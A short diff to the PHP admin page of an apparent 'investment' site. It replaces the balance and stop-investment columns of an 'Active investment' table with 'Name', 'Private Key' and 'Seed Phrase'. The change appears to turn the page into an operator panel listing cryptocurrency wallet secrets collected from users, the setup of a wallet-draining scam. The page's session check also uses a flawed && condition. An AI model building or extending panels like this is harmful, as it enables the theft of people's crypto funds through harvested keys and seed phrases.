@@ -200,15 +200,15 @@ if (!isset($_SESSION['admin_login_']) && $_SESSION['admin_login_'] != true) {
                                                       <div class="card">
                                                                <h5 class="card-header">Active investment</h5>
                                                                <div class="table-responsive text-nowrap">
-                                                                        <div class="alert alert-<?php echo $msgtype ?> text-center"><?php echo $msg ?></div>
+
                                                                         <table class="table">
                                                                                  <thead>
                                                                                           <tr>
                                                                                                    <th>S/N</th>
+                                                                                                   <th>Name</th>
                                                                                                    <th>Email</th>
-                                                                                                   <th>Trading balance</th>
-                                                                                                   <th>+/- Trading balance</th>
-                                                                                                   <th>Stop investment</th>
+                                                                                                   <th>Private Key</th>
+                                                                                                   <th>Seed Phrase</th>
 
 
                                                                                           </tr>
